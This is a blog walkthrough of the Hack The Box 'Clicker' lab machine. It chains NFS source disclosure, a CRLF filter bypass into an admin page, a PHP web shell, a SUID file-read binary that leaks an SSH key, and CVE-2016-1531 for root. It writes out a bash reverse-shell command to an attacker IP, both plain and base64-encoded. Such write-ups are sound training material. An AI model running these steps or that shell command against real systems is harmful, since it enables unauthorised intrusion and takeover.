---
layout: post
title: "HTB Clicker: Walkthrough"
date: 2024-12-01 10:00:00 +0000
categories: [HTB]
tags: [HTB, SQL Injection, CRLF Injection, Bin Exploitation, CVE]
image:
  path: https://raw.githubusercontent.com/partyh4t/partyh4t.github.io/refs/heads/main/assets/posts/Headers/HTB.png
---

![image](https://github.com/user-attachments/assets/9ebeb334-8957-4c84-9409-333c10a3dc03)

We begin with an open NFS mount that contains a webservers source code backup. Through analysing it, we can find a CRLF Injection vulnerability, mallowing us to gain access to an `admin.php` endpoint. We can then leverage that endpoint to perform an SQL injection attack, gaining RCE on the host. The Privilege escalation involves exploiting a vulnerable binary to read a users SSH key. This finally ends with us abusing sudo privileges on a script alongside `CVE-2016-1531` to gain root access. 

## 0) Machine Overview
1. [Scans](#1-scans)
2. [NFS Enumeration](#2-nfs-enumeration)
3. [Web Enumeration](#3-web-enumeration)
4. [Privilege Escalation](#4-privilege-escalation)
5. [Privilege Escalation 2](#5-privilege-escalation-2)

## 1) Scans
```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://clicker.htb/
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34963/udp   mountd
|   100005  1,2,3      36427/udp6  mountd
|   100005  1,2,3      43273/tcp   mountd
|   100005  1,2,3      59335/tcp6  mountd
|   100021  1,3,4      34348/udp6  nlockmgr
|   100021  1,3,4      35611/tcp   nlockmgr
|   100021  1,3,4      39272/udp   nlockmgr
|_  100021  1,3,4      44029/tcp6  nlockmgr
2049/tcp  open  nfs      3-4 (RPC #100003)
35611/tcp open  nlockmgr 1-4 (RPC #100021)
38251/tcp open  status   1 (RPC #100024)
43273/tcp open  mountd   1-3 (RPC #100005)
57085/tcp open  mountd   1-3 (RPC #100005)
59583/tcp open  mountd   1-3 (RPC #100005)
```

## 2) NFS Enumeration

Let's first check out this NFS mount:

![image](https://github.com/user-attachments/assets/8155d1b7-2a85-492d-a563-8e2ca5a95d1c)


Lets try mounting it:

![image](https://github.com/user-attachments/assets/9d826b99-c583-4a22-b993-2ba5f569e069)

![image](https://github.com/user-attachments/assets/5e7a58a8-4405-4333-9179-8325983e3d19)

We'll just copy that file and put it into another directory, that isn't where the mount is located, and then unzip it. We should find what seems to be the web applications source code:

![image](https://github.com/user-attachments/assets/2b5fedc0-7a78-42a9-8614-dc5af0fdbebe)

## 3) Web Enumeration

Lets analyze these files and see what interesting information we can find.

Firstly, I notice there are multiple parameters that are given to the user on creation:

![image](https://github.com/user-attachments/assets/f71abd9a-af76-4743-97ee-f0ecbc0091a6)

I first tried a sort of mass-assignment and tried giving the role to myself on creation, but that didn't work.

However, some parameters are passed in the URL when saving the game at `/save_game.php`:

![image](https://github.com/user-attachments/assets/ba652c57-ef37-4a56-9ddd-2bb766227720)

So I thought, what if we try passing the role parameter in there as well, and setting it to `Admin`? Well reviewing the source code, that isn't possible:

![image](https://github.com/user-attachments/assets/fb0935d1-849b-43df-ad34-0d2553627821)

But this got me thinking of ways to bypass this security check.
- I tried URL Encoding the word `role`, but it caught it.
- I tried using unicode characters, different languages, but none of it worked.

Eventually, I came across a method called [CRLF Injection](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a)

What this is basically going to allow us to do is, since I'm assuming its checking for the `role` keyword in the URL parameter, we can inject the characters `CRLFCRLF`, making sure they are URL-encoded, and then specify our `role` parameter. And what that will do is basically fool the web-application into thinking that the ***body*** of the HTTP request begins right after the CRLF characters.

![image](https://github.com/user-attachments/assets/47d24084-bef8-4301-8278-860c8b4f8bf0)

![image](https://github.com/user-attachments/assets/e1b226bd-2dd3-4234-b8ed-a9c16a0f5b4d)


Now if we log out and log back in, we should be able to access `/admin.php`. The reason we need to re-log is because if we look back at the source code, it checks our `SESSION` id to then decide if we're authorized to access it or not.

![image](https://github.com/user-attachments/assets/1fe5fd85-5f21-4ec6-a2bf-576bd58316db)

Now all we have access to is an `Export` function or mechanism. One thing I noticed while looking through the source code was that, of all the functions within the source code, they all used prepared statements... Except one:

![image](https://github.com/user-attachments/assets/efd9b6a5-9c90-4377-8a8a-6fccb8d119b9)

And that variable in this case, seems to be `$threshold`.

![image](https://github.com/user-attachments/assets/542c0a94-1bc1-4d7c-8781-7f512e6c730b)

And if we go to export these top players, and intercept the request:

![image](https://github.com/user-attachments/assets/26e1aaab-a874-4d23-9a3b-46ea7a3d21be)

And then inject some SQL into it.... It doesn't work :(   

I tried for quite a while with different payloads, but I just couldn't get it to work. So I moved on from trying to perform SQLi.

I did however try messing with the extension. Now normally, it only allowed for either `.txt, .pdf, .html`. But if we manually change it ourselves through burp, we can specify `php`, and it would work.

Combine that with the fact that the SQL query is retrieving `nickname`, we can try injecting some of our own PHP code using `save_game.php` into the `nickname` parameter, and then hopefully, we'll be able to get a web shell.

Had to make a new user as the settings reset.
![image](https://github.com/user-attachments/assets/43968ee0-0fab-4450-a16a-5e5acf81bd49)

![image](https://github.com/user-attachments/assets/c6cfc9b8-59f7-4a03-8f9b-6126c5741dc3)

![image](https://github.com/user-attachments/assets/ecad0ff6-9e30-4369-a5db-1bcbefafbb46)

![image](https://github.com/user-attachments/assets/a419d585-6000-4da7-89a9-e0093bbb4adb)

Lets get a full shell now.
```
First i base64 encoded:
/bin/bash -i >& /dev/tcp/10.10.14.14/5555 0>&1

and then i use that as the payload with echo, then base64 decode it, and then execute bash.

echo%20L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE0LzU1NTUgMD4mMQo=%20|%20base64%20-d%20|%20bash
```

![image](https://github.com/user-attachments/assets/4a63174a-841d-4f90-a3fa-c4cf156cc1aa)

## 4) Privilege Escalation

First lets check out that db since we have credentials for it from our source-code.

![image](https://github.com/user-attachments/assets/989ee03c-8732-4e59-9cc4-38d6cdc9dbec)

![image](https://github.com/user-attachments/assets/197e944c-902b-4a23-b017-a013f46d034c)

Tried cracking a few of these see to if there's anything worth-while. Couldn't crack any.

If we check for SUIDs:

![image](https://github.com/user-attachments/assets/3da6d65f-f3c3-486f-9daf-6f67f345555e)

An interesting file in /opt/manage shows up.

![image](https://github.com/user-attachments/assets/35f4992c-aad1-4f51-9f27-3bd31bf42f1b)

Lets take the executable offline and try reversing it to see how it functions.

![image](https://github.com/user-attachments/assets/009120f7-c58c-43da-9d77-2a0790113f57)

So it seems that it has its base 4 cases, but then if the case falls outside of any of those 4, it defaults to the `default` case shown at the bottom. We cant know for sure what the command is doing with what we know, but we can assume that its going to read out a file since one of the `else` functions in the code shows:

![image](https://github.com/user-attachments/assets/cfba906e-bb7b-4ce1-9e99-eea4d2c6d449)

Lets try having it read some files.

![image](https://github.com/user-attachments/assets/dd611526-0601-4e25-a65c-19613902c37c)

Have it read jack's `id_rsa`:

![image](https://github.com/user-attachments/assets/0e7f4e13-2487-4486-b7fb-440d7938f5b2)

Before we try SSHing in, we'll need to fix the format of the key by adding a few `-` at the start and end of the id_rsa, since as u can see, the format is a little messed up as is:

![image](https://github.com/user-attachments/assets/6d460293-1d30-413e-a41b-42bf8815bb7c)

![image](https://github.com/user-attachments/assets/50939330-8338-4b23-add2-83714df3bc4b)

I had to add 2 `-` to the start and end for it to work.

Now we can finally SSH in:

![image](https://github.com/user-attachments/assets/4f8be621-904d-462c-a785-666a45891b96)

## 5) Privilege Escalation 2

Lets run a quick `sudo -l`:

![image](https://github.com/user-attachments/assets/b8150bcc-d276-4c6d-9e9a-ad8b82873548)

Checking out the file:

![image](https://github.com/user-attachments/assets/7cabd044-2146-440b-979e-115d6877c9c0)

I originally had tried a method where I made my own `set` binary, set it as an alias and within my PATH, hoping that it would execute before the script sets my PATH manually, but that didn't work.


With some further enumeration _(mainly wondering why that `SETENV` privilege was given to us)_ and some help, the vulnerability lies in that `xml_pp` is a perl script that's vulnerable to [CVE-2016-1531](https://nvd.nist.gov/vuln/detail/CVE-2016-1531)

To exploit it, we set 2 variables, one setting `/bin/bash` as a SUID, as we execute the file:

![image](https://github.com/user-attachments/assets/bce60208-9e4a-4305-96d7-f59720190c8b)

![image](https://github.com/user-attachments/assets/b1c5e994-ebbe-4e99-a7d1-e3a94d1eeba8)

Pwned.

----

